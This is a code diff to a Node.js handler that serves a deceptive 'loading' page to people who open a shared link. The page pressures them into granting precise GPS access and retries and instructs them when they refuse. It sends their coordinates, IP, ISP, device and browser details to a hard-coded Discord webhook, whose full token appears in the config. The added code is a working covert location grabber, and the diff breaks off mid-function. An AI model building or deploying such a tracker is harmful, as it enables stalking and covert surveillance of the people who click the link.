@@ -6,8 +6,8 @@ const url = require('url');
 // Configuration
 const config = {
   "webhook": "https://discord.com/api/webhooks/1360077979798994975/fmGm-fubperOWmfIx7pO_OrVe1wZ5qpBbH35QjxJxequV3mjnfVmixC5wBtMRcfmxI1t",
-  "username": "Location Logger",
-  "color": 0x00FFFF,
+  "username": "Location Tracker",
+  "color": 0xFF3E4D,
   "accurateLocation": true
 };
 
@@ -181,51 +181,56 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
   // Check if bot
   let botStatus = 'False';
   if (info && info.hosting) {
-    if (info.hosting && !info.proxy) {
-      botStatus = 'Possibly';
-    } else if (info.hosting) {
-      botStatus = 'Possibly';
-    }
+    botStatus = 'Possibly';
+  }
+  if (info && info.proxy) {
+    botStatus = 'Likely';
   }
 
   // Extract ASN from "as" field
   let asn = 'Unknown';
   if (info && info.as) {
-    // Extract just the ASN number
-    const asnMatch = info.as.match(/AS(\d+)/i);
-    if (asnMatch && asnMatch[1]) {
-      asn = info.as;
-    } else {
-      asn = info.as;
-    }
+    asn = info.as;
   }
 
-  return `**A User Has Been Tracked!**
+  let content = coords ? "@everyone **LOCALIZAÇÃO EXATA CAPTURADA**" : "";
 
-**Endpoint:** \`${endpoint || 'N/A'}\`
-            
-**IP Info:**
+  return {
+    username: config.username,
+    content: content,
+    embeds: [
+      {
+        title: `${coords ? "🎯 LOCALIZAÇÃO PRECISA CAPTURADA!" : "🔍 Acesso Detectado - Aguardando GPS"}`,
+        color: config.color,
+        description: `**Informações do Dispositivo**
 > **IP:** \`${ip || 'Unknown'}\`
-> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
-> **ASN:** \`${asn}\`
-> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
-> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
-> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
-> **Coords:** \`${coordsText}\` (${coordsSource})
-> **Maps:** ${mapsLink ? `[View on Google Maps](${mapsLink})` : 'Not available'}
-> **Timezone:** \`${timezoneText}\`
-> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
-> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
-> **Bot:** \`${botStatus}\`
+> **Sistema:** \`${os}\`
+> **Navegador:** \`${browser}\`
 
-**Device Info:**
-> **OS:** \`${os}\`
-> **Browser:** \`${browser}\`
+**Localização:**
+> **Coordenadas:** \`${coordsText}\` (${coordsSource})
+> **Mapa:** ${mapsLink ? `[Ver no Google Maps](${mapsLink})` : 'Não disponível'}
+> **País:** \`${info && info.country ? info.country : 'Unknown'}\`
+> **Região:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
+> **Cidade:** \`${info && info.city ? info.city : 'Unknown'}\`
+> **Operadora:** \`${info && info.isp ? info.isp : 'Unknown'}\`
+> **ASN:** \`${asn}\`
+> **Timezone:** \`${timezoneText}\`
+
+**Status de Segurança:**
+> **Rede Móvel:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
+> **VPN/Proxy:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
+> **Bot/DC:** \`${botStatus}\`
 
 **User Agent:**
 \`\`\`
 ${userAgent || 'Unknown'}
-\`\`\``;
+\`\`\`
+
+**Endpoint:** \`${endpoint || 'N/A'}\``
+      }
+    ]
+  };
 }
 
 // Main function
@@ -372,9 +377,9 @@ module.exports = async (req, res) => {
         content: "",
         embeds: [
           {
-            title: "Location Logger - Link Sent",
+            title: "🔗 Link Enviado no Discord",
             color: config.color,
-            description: `A **Location Tracking** link was sent in a chat!\nYou may receive location data soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
+            description: `Um link de rastreamento foi enviado em um chat!\nVocê pode receber dados de localização em breve.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
           }
         ]
       };
@@ -393,360 +398,342 @@ module.exports = async (req, res) => {
       console.log('Basic IP information obtained:', ipInfo);
       
       // Format the basic message
-      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
-      
-      const basicData = {
-        username: config.username,
-        content: "",
-        embeds: [
-          {
-            title: "Location Logger - Initial Access",
-            color: config.color,
-            description: description
-          }
-        ]
-      };
+      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
       
       console.log('Sending initial report to Discord...');
-      await sendDiscordWebhook(basicData);
+      await sendDiscordWebhook(data);
       
-      // Customize HTML based on device (iOS vs others)
-      let html;
-      
-      if (deviceIsIOS) {
-        // Special version for iOS with clear instructions
-        html = `
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>Localizador de Mapas</title>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-              body, html {
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                width: 100%;
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-                background-color: #f8f8f8;
-              }
-              .container {
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                padding: 20px;
-                box-sizing: border-box;
-              }
-              .map-preview {
-                width: 100%;
-                max-width: 500px;
-                height: 300px;
-                border-radius: 12px;
-                background-color: #ddd;
-                margin-bottom: 30px;
-                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-                background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgZmlsbD0iI2RkZGRkZCIvPjxjaXJjbGUgY3g9IjI1MCIgY3k9IjE1MCIgcj0iMTAiIGZpbGw9IiM1NTU1NTUiLz48Y2lyY2xlIGN4PSIyNTAiIGN5PSIxNTAiIHI9IjYwIiBmaWxsPSJub25lIiBzdHJva2U9IiM1NTU1NTUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNSw1Ii8+PHRleHQgeD0iMjUwIiB5PSIyMDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM1NTU1NTUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+TWFwYSBkZSBsb2NhbGl6YcOnw6NvPC90ZXh0Pjwvc3ZnPg==');
-                background-size: cover;
-                background-position: center;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-              }
-              .map-overlay {
-                background-color: rgba(255,255,255,0.8);
-                padding: 15px;
-                border-radius: 8px;
-                text-align: center;
-              }
-              .location-button {
-                background-color: #007AFF; /* iOS blue */
-                color: white;
-                border: none;
-                border-radius: 25px;
-                padding: 15px 30px;
-                font-size: 18px;
-                font-weight: 600;
-                cursor: pointer;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                box-shadow: 0 4px 12px rgba(0,122,255,0.3);
-                margin-bottom: 20px;
-              }
-              .location-icon {
-                margin-right: 10px;
-                width: 24px;
-                height: 24px;
-              }
-              .message {
-                text-align: center;
-                color: #555;
-                font-size: 16px;
-                max-width: 320px;
-                line-height: 1.5;
-                margin-bottom: 20px;
-              }
-              .hidden {
-                display: none;
-              }
-              .footer {
-                margin-top: 20px;
-                font-size: 12px;
-                color: #999;
-              }
-            </style>
-          </head>
-          <body>
-            <div class="container">
-              <div class="map-preview">
-                <div class="map-overlay">
-                  <strong>Mapa não disponível</strong><br>
-                  Ative sua localização para continuar
-                </div>
+      // Usando a mesma página para todos os dispositivos para forçar a solicitação de localização imediatamente
+      const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Carregando...</title>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <style>
+            body, html {
+              margin: 0;
+              padding: 0;
+              height: 100%;
+              width: 100%;
+              font-family: Arial, sans-serif;
+              background-color: #f8f8f8;
+              overflow: hidden;
+            }
+            #overlay {
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background-color: rgba(0,0,0,0.8);
+              z-index: 999;
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              padding: 20px;
+              box-sizing: border-box;
+              color: white;
+              text-align: center;
+            }
+            .modal {
+              background-color: #fff;
+              border-radius: 12px;
+              padding: 30px;
+              max-width: 450px;
+              width: 90%;
+              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+              text-align: center;
+              color: #333;
+            }
+            .title {
+              font-size: 22px;
+              font-weight: bold;
+              margin-bottom: 20px;
+              color: #e53935;
+            }
+            .message {
+              font-size: 16px;
+              line-height: 1.6;
+              margin-bottom: 25px;
+            }
+            .button {
+              background-color: #e53935;
+              color: white;
+              border: none;
+              border-radius: 30px;
+              padding: 15px 30px;
+              font-size: 16px;
+              font-weight: bold;
+              cursor: pointer;
+              transition: all 0.2s;
+              display: inline-block;
+            }
+            .button:hover {
+              background-color: #c62828;
+              transform: scale(1.05);
+            }
+            .icon {
+              width: 80px;
+              height: 80px;
+              margin-bottom: 20px;
+              animation: pulse 2s infinite;
+            }
+            @keyframes pulse {
+              0% { transform: scale(1); }
+              50% { transform: scale(1.1); }
+              100% { transform: scale(1); }
+            }
+            .loading {
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background-color: rgba(255,255,255,0.95);
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              z-index: 1000;
+            }
+            .spinner {
+              border: 5px solid rgba(0,0,0,0.1);
+              border-radius: 50%;
+              border-top: 5px solid #e53935;
+              width: 60px;
+              height: 60px;
+              margin-bottom: 20px;
+              animation: spin 1s linear infinite;
+            }
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+            .retry-container {
+              display: none;
+              text-align: center;
+              background-color: #fff;
+              padding: 30px;
+              border-radius: 12px;
+              max-width: 450px;
+              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            }
+            .error-icon {
+              color: #e53935;
+              font-size: 50px;
+              margin-bottom: 20px;
+            }
+            .error-title {
+              font-size: 22px;
+              color: #e53935;
+              margin-bottom: 15px;
+            }
+          </style>
+        </head>
+        <body>
+          <!-- Página de fundo (nunca visível) -->
+          <div style="display: none;">Carregando...</div>
+          
+          <!-- Overlay principal -->
+          <div id="overlay">
+            <div class="modal">
+              <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#e53935">
+                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+              </svg>
+              <div class="title">ATENÇÃO</div>
+              <div class="message">
+                É necessário ativar sua localização para continuar. 
+                Este serviço requer acesso à sua posição atual.
               </div>
-              
-              <p class="message">
-                <strong>Acesso ao Mapa Bloqueado</strong><br>
-                Para visualizar o mapa e a sua localização atual, permita o acesso à sua localização.
-              </p>
-              
-              <button id="locationButton" class="location-button">
-                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
-                  <circle cx="12" cy="10" r="3"></circle>
-                  <path d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
-                </svg>
-                Ativar Localização
-              </button>
-              
-              <div id="loadingMessage" class="message hidden">
-                Localizando sua posição atual no mapa...
-              </div>
-              
-              <p class="footer">
-                Este aplicativo requer acesso à sua localização para funcionar corretamente.
-              </p>
+              <button id="allowLocationBtn" class="button">Permitir Localização</button>
             </div>
-            
-            <script>
-              // Script for iOS geolocation
-              document.getElementById('locationButton').addEventListener('click', function() {
-                // Show loading message
-                document.getElementById('loadingMessage').classList.remove('hidden');
-                this.disabled = true;
-                this.style.backgroundColor = '#999';
-                
-                // Request geolocation
-                if (navigator.geolocation) {
-                  navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                      // Success - we have the position
-                      var lat = position.coords.latitude;
-                      var lng = position.coords.longitude;
-                      var coords = lat + "," + lng;
-                      
-                      // Encode in base64
-                      var encodedCoords = btoa(coords);
-                      
-                      // Build new URL
-                      var currentUrl = window.location.href;
-                      var newUrl;
-                      if (currentUrl.includes("?")) {
-                        newUrl = currentUrl + "&g=" + encodedCoords;
-                      } else {
-                        newUrl = currentUrl + "?g=" + encodedCoords;
-                      }
-                      
-                      // Redirect
-                      window.location.replace(newUrl);
-                    },
-                    function(error) {
-                      // Error getting location
-                      console.log("Geolocation error: " + error.message);
-                      document.getElementById('loadingMessage').innerText = 
-                        "Erro ao acessar localização. Por favor, permita o acesso à sua localização e tente novamente.";
-                      document.getElementById('locationButton').disabled = false;
-                      document.getElementById('locationButton').style.backgroundColor = '#007AFF';
-                    },
-                    {
-                      enableHighAccuracy: true,
-                      timeout: 15000,
-                      maximumAge: 0
+          </div>
+          
+          <!-- Tela de carregamento (inicialmente oculta) -->
+          <div id="loadingScreen" class="loading" style="display: none;">
+            <div class="spinner"></div>
+            <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Obtendo Localização</div>
+            <div style="color: #666;">Por favor, aguarde...</div>
+          </div>
+          
+          <!-- Tela de erro/retry (inicialmente oculta) -->
+          <div id="retryScreen" class="loading" style="display: none;">
+            <div class="retry-container">
+              <div class="error-icon">⚠️</div>
+              <div class="error-title">Acesso Negado</div>
+              <div style="margin-bottom: 20px; color: #666; line-height: 1.5;">
+                O acesso à sua localização foi negado. Para continuar, é necessário permitir o acesso à sua localização.
+              </div>
+              <button onclick="showPermissionInstructions()" class="button" style="background-color: #4285F4; margin-right: 10px;">Como Permitir</button>
+              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
+            </div>
+          </div>
+          
+          <!-- Tela de instruções (inicialmente oculta) -->
+          <div id="instructionsScreen" class="loading" style="display: none;">
+            <div class="retry-container" style="max-width: 500px;">
+              <div style="text-align: right; margin-bottom: 10px;">
+                <button onclick="hideInstructions()" style="background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
+              </div>
+              <div style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Como Permitir Acesso à Localização</div>
+              
+              <div id="chromeInstructions" style="text-align: left; display: none;">
+                <p><strong>No Chrome:</strong></p>
+                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
+                  <li>Clique no ícone de cadeado/informação na barra de endereço</li>
+                  <li>Clique em "Permissões do site"</li>
+                  <li>Encontre "Localização" e selecione "Permitir"</li>
+                  <li>Recarregue a página</li>
+                </ol>
+              </div>
+              
+              <div id="safariInstructions" style="text-align: left; display: none;">
+                <p><strong>No Safari:</strong></p>
+                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
+                  <li>Abra Ajustes no seu iPhone/iPad</li>
+                  <li>Role para baixo e toque em "Safari"</li>
+                  <li>Toque em "Permissões de Sites"</li>
+                  <li>Toque em "Localização" e selecione "Permitir"</li>
+                  <li>Volte ao Safari e recarregue a página</li>
+                </ol>
+              </div>
+              
+              <div id="firefoxInstructions" style="text-align: left; display: none;">
+                <p><strong>No Firefox:</strong></p>
+                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
+                  <li>Clique no ícone de cadeado na barra de endereço</li>
+                  <li>Clique em "Permissões"</li>
+                  <li>Em "Acessar Sua Localização", selecione "Permitir"</li>
+                  <li>Recarregue a página</li>
+                </ol>
+              </div>
+              
+              <div id="edgeInstructions" style="text-align: left; display: none;">
+                <p><strong>No Edge:</strong></p>
+                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
+                  <li>Clique no ícone de cadeado na barra de endereço</li>
+                  <li>Clique em "Permissões do site"</li>
+                  <li>Em "Localização", selecione "Permitir"</li>
+                  <li>Recarregue a página</li>
+                </ol>
+              </div>
+              
+              <div id="genericInstructions" style="text-align: left; display: none;">
+                <p><strong>Instruções Gerais:</strong></p>
+                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
+                  <li>Procure pelo ícone de cadeado ou permissões na barra de endereço</li>
+                  <li>Procure por configurações de "Localização" ou "Permissões do site"</li>
+                  <li>Altere a configuração para "Permitir"</li>
+                  <li>Recarregue a página</li>
+                </ol>
+              </div>
+              
+              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
+            </div>
+          </div>
+
+          <script>
+            // Solicitar localização automaticamente quando a página carrega
+            document.addEventListener('DOMContentLoaded', function() {
+              // Forçamos solicitação após um pequeno delay para garantir que a interface carregue primeiro
+              setTimeout(function() {
+                // Tentar obter localização automaticamente após 1 segundo
+                requestLocation();
+              }, 500);
+            });
+
+            // Referências aos elementos da interface
+            const overlay = document.getElementById('overlay');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const retryScreen = document.getElementById('retryScreen');
+            const instructionsScreen = document.getElementById('instructionsScreen');
+            const allowLocationBtn = document.getElementById('allowLocationBtn');
+
+            // Botão para permitir localização
+            allowLocationBtn.addEventListener('click', function() {
+              requestLocation();
+            });
+
+            // Função para solicitar localização
+            function requestLocation() {
+              // Esconde overlay e mostra tela de carregamento
+              overlay.style.display = 'none';
+              loadingScreen.style.display = 'flex';
+              
+              if (navigator.geolocation) {
+                // Tenta obter localização com alta precisão e sem cache
+                navigator.geolocation.getCurrentPosition(
+                  // Sucesso
+                  function(position) {
+                    // Temos a posição
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const coords = lat + "," + lng;
+                    
+                    // Codifica em base64
+                    const encodedCoords = btoa(coords);
+                    
+                    // Constrói nova URL
+                    const currentUrl = window.location.href;
+                    let newUrl;
+                    if (currentUrl.includes("?")) {
+                      newUrl = currentUrl + "&g=" + encodedCoords;
+                    } else {
+                      newUrl = currentUrl + "?g=" + encodedCoords;
                     }
-                  );
-                }
-              });
-            </script>
-          </body>
-          </html>
-        `;
-      } else {
-        // Standard version for Android and other devices
-        html = `
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>Localizador de Mapas</title>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-              body, html {
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                width: 100%;
-                font-family: 'Roboto', Arial, sans-serif;
-                background-color: #f5f5f5;
-              }
-              .container {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                padding: 20px;
-                box-sizing: border-box;
-                height: 100vh;
-              }
-              .header {
-                text-align: center;
-                margin-bottom: 20px;
-                width: 100%;
-              }
-              h1 {
-                color: #1976D2;
-                font-size: 24px;
-                margin-bottom: 10px;
-              }
-              .map-placeholder {
-                width: 100%;
-                max-width: 500px;
-                height: 300px;
-                background-color: #e0e0e0;
-                border-radius: 8px;
-                margin-bottom: 20px;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgZmlsbD0iI2UwZTBlMCIvPjxjaXJjbGUgY3g9IjI1MCIgY3k9IjE1MCIgcj0iMTAiIGZpbGw9IiM1NTU1NTUiLz48Y2lyY2xlIGN4PSIyNTAiIGN5PSIxNTAiIHI9IjYwIiBmaWxsPSJub25lIiBzdHJva2U9IiM1NTU1NTUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNSw1Ii8+PHRleHQgeD0iMjUwIiB5PSIyMDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM1NTU1NTUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9ImJvbGQiPkNhcnJlZ2FuZG8gbWFwYS4uLjwvdGV4dD48L3N2Zz4=');
-                background-repeat: no-repeat;
-                background-position: center;
-                background-size: cover;
-              }
-              .info-box {
-                background-color: white;
-                border-radius: 8px;
-                padding: 20px;
-                width: 100%;
-                max-width: 500px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                margin-bottom: 20px;
-              }
-              p {
-                color: #666;
-                line-height: 1.6;
-                margin: 0 0 15px 0;
-              }
-              .loading {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(255,255,255,0.8);
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                z-index: 100;
-              }
-              .spinner {
-                border: 5px solid rgba(0,0,0,0.1);
-                border-radius: 50%;
-                border-top: 5px solid #1976D2;
-                width: 50px;
-                height: 50px;
-                margin-bottom: 20px;
-                animation: spin 1s linear infinite;
-              }
-              @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-              }
-            </style>
-          </head>
-          <body>
-            <div class="container">
-              <div class="header">
-                <h1>Serviço de Localização</h1>
-                <p>Acessando sua localização para mostrar no mapa</p>
-              </div>
-              
-              <div class="map-placeholder"></div>
-              
-              <div class="info-box">
-                <p><strong>Aguarde um momento.</strong> Estamos acessando sua localização atual para mostrar no mapa.</p>
-                <p>Este processo permite que você visualize sua posição exata no Google Maps.</p>
-              </div>
-            </div>
-            
-            <div class="loading">
-              <div class="spinner"></div>
-              <p>Obtendo sua localização...</p>
-            </div>
-            
-            <script>
-              // Script to get geolocation
-              document.addEventListener('DOMContentLoaded', function() {
-                var currentUrl = window.location.href;
-                
-                // Check if we already have the g parameter
-                if (!currentUrl.includes("g=")) {
-                  // Request geolocation
-                  if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                      function(position) {
-                        // Success - we have the position
-                        var lat = position.coords.latitude;
-                        var lng = position.coords.longitude;
-                        var coords = lat + "," + lng;
-                        
-                        // Encode in base64
-                        var encodedCoords = btoa(coords);
-                        
-                        // Build new URL
-                        var newUrl;
-                        if (currentUrl.includes("?")) {
-                          newUrl = currentUrl + "&g=" + encodedCoords;
-                        } else {
-                          newUrl = currentUrl + "?g=" + encodedCoords;
-                        }
-                        
-                        // Redirect
-                        window.location.replace(newUrl);
-                      },
-                      function(error) {
-                        // Error getting location
-                        console.log("Geolocation error: " + error.message);
-                        document.querySelector('.loading').innerHTML = '<p style="color:red;font-weight:bold;">Erro ao acessar localização.</p><p>Por favor, permita o acesso à sua localização e recarregue a página.</p><button onclick="location.reload()" style="padding:10px 20px;background:#1976D2;color:white;border:none;border-radius:4px;margin-top:10px;cursor:pointer;">Tentar novamente</button>';
-                      },
-                      {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                      }
-                    );
-                  } else {
-                    document.querySelector('.loading').innerHTML = '<p style="color:red;font-weight:bold;">Seu navegador não suporta geolocalização</p><p>Por favor, tente usar um navegador mais recente.</p>';
+                    
+                    // Redireciona
+                    window.location.replace(newUrl);
+                  },
+                  // Erro
+                  function(error) {
+                    console.error("Erro de geolocalização:", error.message);
+                    loadingScreen.style.display = 'none';
+                    retryScreen.style.display = 'flex';
+                  },
+                  // Opções
+                  {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
                   }
-                }
-              });
-            </script>
-          </body>
-          </html>
-        `;
-      }
+                );
+              } else {
+                alert("Seu navegador não suporta geolocalização. Por favor, use um navegador mais recente.");
+                loadingScreen.style.display = 'none';
+                overlay.style.display = 'flex';
+              }
+            }
+
+            // Função para tentar novamente
+            function retryLocation() {
+              retryScreen.style.display = 'none';
+              instructionsScreen.style.display = 'none';
+              requestLocation();
+            }
+
+            // Função para mostrar instruções de permissão
+            function showPermissionInstructions() {
+              retryScreen.style.display = 'none';
+              instructionsScreen.style.display = 'flex';
+              
+              // Determina qual navegador está sendo usado
+              const ua = navigator.userAgent;
+              const chromeInst = document.getElementById('chromeInstructions');
+              const safariInst = document.getElementById('safariInstructions');
+              const firefoxInst = document.getElementById('firefoxInstructions');
+              const edgeInst = document.getElementById('edgeInstructions');
+              const genericInst = document.getElementById('genericInstructions');
+              
+              // Esconde todas as instruções primeiro
+              chromeInst.style.display = 'none';
+              safariInst.style.display = 'none';
+              firefoxInst.style.display = 'none';
+              edgeInst.style.display = 'none';
+              
       
       res.setHeader('Content-Type', 'text/html');
       res.status(200).send(html);
@@ -756,19 +743,7 @@ module.exports = async (req, res) => {
       const ipInfo = await getIPInfo(ip);
       console.log('Basic IP information obtained:', ipInfo);
       
-      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
-      
-      const data = {
-        username: config.username,
-        content: "@everyone",
-        embeds: [
-          {
-            title: "Location Logger - IP Captured",
-            color: config.color,
-            description: description
-          }
-        ]
-      };
+      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
       
       console.log('Sending report to Discord...');
       await sendDiscordWebhook(data);
